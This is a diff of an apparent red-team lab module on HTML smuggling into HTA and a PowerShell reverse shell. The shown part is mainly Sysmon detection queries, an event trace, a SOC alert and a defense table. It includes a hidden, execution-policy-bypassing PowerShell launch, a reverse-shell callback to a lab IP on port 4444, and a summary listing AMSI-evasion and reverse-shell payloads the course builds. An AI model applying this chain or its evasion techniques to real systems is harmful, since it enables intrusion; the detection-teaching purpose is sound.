+    Select-Object -First 1 |
+    Format-List TimeCreated, Message
+```
+
+You will see: `powershell.exe -nop -w hidden -ep bypass -f C:\Tools\Labs\svchost.ps1` with parent process `mshta.exe`.
+
+**4. Find the network connection (the reverse shell callback):**
+
+```powershell
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
+    Where-Object {
+        $_.TimeCreated -gt $startTime -and
+        $_.Id -eq 3 -and
+        $_.Message -match "192.168.85.129"
+    } |
+    Select-Object -First 3 |
+    Format-List TimeCreated, Message
+```
+
+You will see: `EID 3 (NetworkConnect)` -- `powershell.exe` connecting to `192.168.85.129:4444` via TCP.
+
+**5. Find all commands executed through the shell:**
+
+```powershell
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
+    Where-Object {
+        $_.TimeCreated -gt $startTime -and
+        $_.Id -eq 1 -and
+        ($_.Message -match "whoami|hostname|ipconfig|net user|systeminfo")
     } |
     Sort-Object TimeCreated |
     Format-List TimeCreated, Message
 ```
 
-You will see the entire execution tree:
+**The complete attack chain as Sysmon sees it:**
 
 ```
-[1] mshta.exe runs ImportantUpdate.hta          (Parent: explorer.exe)
-[2] cmd.exe /c whoami                           (Parent: mshta.exe)
-[3] cmd.exe /c hostname                         (Parent: mshta.exe)
-[4] cmd.exe /c ipconfig | findstr IPv4          (Parent: mshta.exe)
-[5] cmd.exe /c net user                         (Parent: mshta.exe)
-[6] calc.exe                                    (Parent: mshta.exe)
+[EID 15]  firefox.exe created: Downloads\WindowsUpdate.hta
+          Zone.Identifier HostUrl: blob:http://192.168.85.129:8080/...
+          ^^^^^ HTML SMUGGLING INDICATOR
+
+[EID  1]  mshta.exe launched (Parent: explorer.exe)
+          CommandLine: mshta.exe "C:\Users\...\Downloads\WindowsUpdate.hta"
+          ^^^^^ HTA EXECUTION
+
+[EID 11]  mshta.exe created file: C:\Tools\Labs\svchost.ps1
+          ^^^^^ PAYLOAD STAGING
+
+[EID  1]  powershell.exe launched (Parent: mshta.exe)
+          CommandLine: powershell.exe -nop -w hidden -ep bypass -f C:\Tools\Labs\svchost.ps1
+          ^^^^^ REVERSE SHELL LAUNCH
+
+[EID  3]  powershell.exe connected to 192.168.85.129:4444 (TCP outbound)
+          ^^^^^ C2 CALLBACK
+
+[EID  1]  whoami.exe launched (Parent: powershell.exe)
+[EID  1]  hostname.exe launched (Parent: powershell.exe)
+[EID  1]  ipconfig.exe launched (Parent: powershell.exe)
+          ^^^^^ RECONNAISSANCE COMMANDS
 ```
 
-**Every single action is logged.** A SOC analyst would see `mshta.exe` spawning 5 child processes including reconnaissance commands and immediately raise an alert.
+**Every. Single. Step. Is. Logged.** This is why Module 01 (Defense Landscape) exists -- understanding what the defender sees is what separates a professional red team operator from a script kiddie who gets caught.
 
 ---
 
 ## Part 8: Detection Deep Dive -- What Defenders See
 
-### 8.1 Sysmon Detection Matrix for HTML Smuggling
+### 8.1 Sysmon Detection Matrix for the Full Attack Chain
 
 | What Happened | Sysmon Event ID | What Gets Logged |
 |:-------------|:---------------|:-----------------|
-| Browser writes file to Downloads | **EID 11** (FileCreate) | File path, creating process (edge/firefox) |
-| File gets MOTW tag | **EID 15** (FileCreateStreamHash) | Zone.Identifier stream with `blob:` HostUrl |
+| Browser assembles file via Blob API | **EID 15** (FileCreateStreamHash) | Zone.Identifier with `blob:` HostUrl |
+| HTA file written to Downloads | **EID 11** (FileCreate) | File path, creating process (firefox/edge) |
 | User double-clicks the HTA | **EID 1** (ProcessCreate) | `mshta.exe` with HTA path, parent = `explorer.exe` |
-| HTA spawns cmd.exe | **EID 1** (ProcessCreate) | `cmd.exe /c whoami`, parent = `mshta.exe` |
-| whoami.exe runs | **EID 1** (ProcessCreate) | `whoami.exe`, parent = `cmd.exe` |
-| Recon file is created | **EID 11** (FileCreate) | `C:\Tools\Labs\recon_report.txt` |
-| calc.exe opens | **EID 1** (ProcessCreate) | `calc.exe`, parent = `mshta.exe` |
+| HTA writes PowerShell script | **EID 11** (FileCreate) | `C:\Tools\Labs\svchost.ps1` created by mshta |
+| PowerShell reverse shell starts | **EID 1** (ProcessCreate) | `powershell.exe -nop -w hidden`, parent = `mshta.exe` |
+| Reverse shell connects to Kali | **EID 3** (NetworkConnect) | Destination: `192.168.85.129:4444`, TCP outbound |
+| Attacker runs whoami | **EID 1** (ProcessCreate) | `whoami.exe`, parent = `powershell.exe` |
+| Attacker runs ipconfig | **EID 1** (ProcessCreate) | `ipconfig.exe`, parent = `powershell.exe` |
 
 ### 8.2 The Key Detection Indicators
 
@@ -1376,9 +1938,9 @@ Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 |
     Format-List TimeCreated, Message
 ```
 
-**Indicator 2: mshta.exe spawning child processes (EID 1)**
+**Indicator 2: mshta.exe spawning PowerShell (EID 1)**
 
-`mshta.exe` running is not inherently suspicious (some legacy apps use it). But `mshta.exe` spawning `cmd.exe`, `powershell.exe`, `whoami.exe`, or ANY other process is a red flag.
+`mshta.exe` running is not inherently suspicious. But `mshta.exe` spawning `powershell.exe` with `-w hidden` is a massive red flag.
 
 ```powershell
 Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 |
@@ -1386,81 +1948,104 @@ Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 |
     Format-List TimeCreated, Message
 ```
 
-**Indicator 3: Files created in Downloads then executed (EID 11 + EID 1)**
+**Indicator 3: Hidden PowerShell making outbound connections (EID 3)**
+
+A hidden PowerShell process connecting to an external IP on a non-standard port is extremely suspicious.
+
+```powershell
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 |
+    Where-Object { $_.Id -eq 3 -and $_.Message -match "powershell" } |
+    Format-List TimeCreated, Message
+```
+
+**Indicator 4: Rapid file creation then execution from Downloads (EID 11 + EID 1)**
 
 A file appearing in the Downloads folder and being executed within seconds is suspicious, especially if it is an `.hta`, `.bat`, `.cmd`, `.vbs`, or `.js` file.
 
 ### 8.3 What a Professional SOC Alert Would Look Like
 
 ```
-ALERT: Possible HTML Smuggling -> HTA Execution Chain Detected
-Severity: HIGH
+ALERT: HTML Smuggling → HTA → Reverse Shell Detected
+Severity: CRITICAL
 
 Timeline:
-  10:30:42  firefox.exe created file: C:\Users\...\Downloads\ImportantUpdate.hta
+  15:30:42  firefox.exe created file: C:\Users\...\Downloads\WindowsUpdate.hta
             Zone.Identifier: blob:http://192.168.85.129:8080/...
-  10:30:55  mshta.exe launched from explorer.exe
-            Args: "C:\Users\...\Downloads\ImportantUpdate.hta"
-  10:30:56  cmd.exe spawned from mshta.exe
-            Args: cmd.exe /c whoami
-  10:30:56  cmd.exe spawned from mshta.exe
-            Args: cmd.exe /c hostname
-  10:30:57  cmd.exe spawned from mshta.exe
-            Args: cmd.exe /c ipconfig | findstr IPv4
-  10:30:57  cmd.exe spawned from mshta.exe
-            Args: cmd.exe /c net user
-  10:30:58  calc.exe spawned from mshta.exe
+  15:30:55  mshta.exe launched from explorer.exe
+            Args: "C:\Users\...\Downloads\WindowsUpdate.hta"
+  15:30:56  mshta.exe created file: C:\Tools\Labs\svchost.ps1
+  15:30:56  powershell.exe launched from mshta.exe
+            Args: powershell.exe -nop -w hidden -ep bypass -f C:\Tools\Labs\svchost.ps1
+  15:30:57  powershell.exe connected to 192.168.85.129:4444 (TCP outbound)
+  15:31:02  whoami.exe launched from powershell.exe
+  15:31:05  hostname.exe launched from powershell.exe
+  15:31:08  ipconfig.exe launched from powershell.exe
+
+Kill Chain:
+  Delivery:    HTML Smuggling (T1027.006)
+  Execution:   Mshta (T1218.005) → PowerShell (T1059.001)
+  C2:          Non-standard port TCP (T1571)
+  Discovery:   whoami (T1033), hostname (T1082), ipconfig (T1016)
 
 Indicators:
-  - blob: URL in Zone.Identifier (HTML smuggling indicator)
-  - mshta.exe spawning multiple child processes (execution chain)
-  - Reconnaissance commands (whoami, hostname, ipconfig, net user)
-  - File from Downloads folder executed immediately after creation
+  ✗ blob: URL in Zone.Identifier (HTML smuggling fingerprint)
+  ✗ mshta.exe → powershell.exe parent-child chain
+  ✗ PowerShell with -w hidden and outbound network connection
+  ✗ Multiple reconnaissance commands in rapid succession
 
-Recommendation: Isolate endpoint, investigate user activity, block source IP
+Recommendation: ISOLATE ENDPOINT IMMEDIATELY
 ```
 
 ### 8.4 How Defenders Would Stop This
 
-| Defense Layer | How It Would Block This Chain |
-|:-------------|:-----------------------------|
-| **Email Gateway** | Cannot block -- no file was attached to the email. Only a link to the smuggling page. |
-| **Web Proxy** | Could block the HTML page IF it can execute JavaScript and detect Blob creation. Most proxies cannot. |
-| **MOTW + SmartScreen** | SmartScreen may warn when the HTA is opened (if it has MOTW). User must click through. |
-| **ASR Rules** | Rule "Block JavaScript or VBScript from launching downloaded executable content" (D3E037E1) would block the HTA from spawning cmd.exe if enabled. |
-| **EDR / Behavioral Detection** | Would flag `mshta.exe` spawning `cmd.exe` with reconnaissance commands. This is the strongest defense. |
-| **WDAC / AppLocker** | Could block `mshta.exe` entirely if not needed for business operations. Strongest prevention. |
+| Defense Layer | How It Would Block This Chain | Effectiveness |
+|:-------------|:-----------------------------|:-------------|
+| **Email Gateway** | Cannot block -- no malicious file in the email, just a link | ❌ Bypassed |
+| **Web Proxy** | Could block if it executes JS and detects Blob creation. Most proxies cannot. | ❌ Bypassed |
+| **MOTW + SmartScreen** | SmartScreen warns when HTA is opened. User must click "Run anyway". | ⚠️ Requires user click-through |
+| **AMSI** | Scans PowerShell commands. Our obfuscation may bypass, or the staged approach avoids AMSI entirely. | ⚠️ Partially bypassed |
+| **ASR Rules** | Rule D3E037E1 "Block JavaScript/VBScript from launching downloaded executable content" would block this. | ✅ Would block if enabled in Block mode |
+| **EDR Behavioral** | Would flag mshta → powershell with hidden window + outbound connection. | ✅ Strong detection |
+| **WDAC / AppLocker** | Could block mshta.exe entirely if not needed for business. | ✅ Strongest prevention |
+| **Network Monitoring** | Would detect outbound connection to unusual port (4444). | ✅ Would alert |
 
 ### 8.5 The Attacker-Defender Balance
 
 ```
 What the attacker controls:
-  + Delivery mechanism (HTML smuggling bypasses perimeter)
-  + File content (XOR encryption hides from static analysis)
-  + Social engineering (page design tricks the user into opening the file)
-  + Execution binary (mshta.exe is signed by Microsoft)
+  ✓ Delivery: HTML smuggling bypasses all perimeter defenses
+  ✓ Encryption: XOR hides payload from static analysis
+  ✓ Social engineering: Professional page design tricks the user
+  ✓ Execution: mshta.exe is signed by Microsoft
+  ✓ AMSI evasion: String fragmentation hides malicious patterns
+  ✓ Persistence: Reverse shell runs in a hidden PowerShell process
 
 What the defender controls:
-  + Sysmon telemetry (logs the entire chain)
-  + ASR rules (can block the execution pattern)
-  + EDR behavioral detection (flags suspicious parent-child relationships)
-  + WDAC/AppLocker (can block mshta.exe entirely)
-  + User training (teach users not to open unexpected .hta files)
+  ✓ Sysmon telemetry: Logs every step of the attack chain
+  ✓ ASR rules: Can block the mshta → script execution pattern
+  ✓ EDR behavioral detection: Flags suspicious process chains
+  ✓ WDAC/AppLocker: Can block mshta.exe entirely
+  ✓ Network monitoring: Detects C2 callbacks on unusual ports
+  ✓ User training: Teach users not to open unexpected .hta files
 ```
+
+**The key insight:** No single defense stops this entire chain. It takes defense-in-depth (multiple layers working together) to reliably detect and block HTML smuggling attacks. That is exactly why this technique remains effective -- most organizations do not have all layers properly configured.
 
 ---
 
 ## Summary -- What You Built
 
-| Exercise | What You Did | Technique |
-|:---------|:-------------|:----------|
-| Part 2 | Smuggled a text file via Blob API | Basic HTML smuggling |
-| Part 3 | Smuggled a compiled Windows executable | EXE smuggling with build script |
-| Part 4 | Added XOR encryption to hide the payload | Encrypted smuggling |
-| Part 5 | Created an HTA execution chain via mshta.exe | HTA smuggling + LOLBin execution |
-| Part 6 | Added anti-sandbox checks (mouse, screen, timing) | Anti-analysis evasion |
-| Part 7 | Ran a full attack chain with recon output | Complete simulation |
-| Part 8 | Analyzed every Sysmon event in the attack chain | Detection analysis |
+| Exercise | What You Did | Technique | Shell? |
+|:---------|:-------------|:----------|:-------|
+| Part 2 | Smuggled a text file via Blob API | Basic HTML smuggling | No |
+| Part 3 | Smuggled a compiled Windows executable | EXE smuggling + build script | No |
+| Part 4 | Added XOR encryption to hide the payload | Encrypted smuggling | No |
+| Part 5.2-5.4 | Created an HTA → calc.exe proof of concept | HTA smuggling + LOLBin | No |
+| Part 5.6 | HTA → PowerShell → whoami recon | Command execution chain | No |
+| Part 5.9-5.10 | Built an obfuscated reverse shell HTA | AMSI evasion + reverse shell | **YES** |
+| Part 6 | Added anti-sandbox checks (mouse, screen, timing) | Anti-analysis evasion | No |
+| Part 7 | Full chain: XOR-encrypted smuggled HTA → reverse shell | **Complete attack simulation** | **YES** |
+| Part 8 | Traced every Sysmon event in the attack chain | Detection analysis | — |
 
 ### Tools You Now Have on Kali
 
@@ -1472,27 +2057,31 @@ What the defender controls:
         xor_encode.py            -- XOR + Base64 payload encoder
     payloads/
         poc.c / poc.exe          -- Proof-of-concept executable (opens calc)
-        update.hta               -- Basic HTA payload
-        recon.hta                -- Reconnaissance HTA
-        fullchain.hta            -- Full chain recon HTA
+        update.hta               -- Basic HTA payload (calc POC)
+        recon.hta                -- Reconnaissance HTA (whoami, systeminfo)
+        revshell.hta             -- Obfuscated reverse shell HTA (direct)
+        revshell_staged.hta      -- Staged reverse shell HTA (via exclusion folder)
+        shell_final.hta          -- Full chain reverse shell HTA
     html/
         smuggle-text.html        -- Text file smuggling demo
         smuggle-exe.html         -- EXE smuggling demo
         smuggle-xor.html         -- XOR-encrypted EXE smuggling
-        smuggle-hta.html         -- HTA smuggling demo
+        smuggle-hta.html         -- HTA smuggling (calc)
         smuggle-recon.html       -- Recon HTA smuggling
         smuggle-advanced.html    -- Anti-analysis demo page
-        fullchain.html           -- Complete attack chain demo
+        final_chain.html         -- Complete attack chain (reverse shell)
 ```
 
 ### Key Takeaways
 
-1. **HTML smuggling bypasses perimeter defenses** because no malicious file crosses the network
+1. **HTML smuggling bypasses perimeter defenses** because no malicious file crosses the network -- the payload is assembled inside the browser
 2. **XOR encryption adds a layer** that defeats static content inspection of the HTML source
-3. **HTA + mshta.exe provides execution** via a trusted Microsoft binary
-4. **Anti-analysis techniques** (mouse detection, screen checks, delays) help evade automated sandboxes
-5. **MOTW is still applied** -- smuggling defeats the gateway, not the endpoint
-6. **Every step is logged in Sysmon** -- understanding the detection trail is what separates professionals from script kiddies
+3. **HTA + mshta.exe provides code execution** via a trusted, Microsoft-signed binary
+4. **String fragmentation evades AMSI** by preventing malicious class names from appearing as literals in the script source
+5. **Reverse shells use outbound TCP connections** which firewalls rarely block, giving you interactive access to the target
+6. **Anti-analysis techniques** (mouse detection, screen checks, delays) help evade automated sandbox analysis
+7. **MOTW is still applied** -- smuggling defeats the gateway, not the endpoint. SmartScreen still warns.
+8. **Every step is logged in Sysmon** -- understanding the detection trail is what separates a professional red team operator from someone who gets caught on their first engagement
 
 ---
 
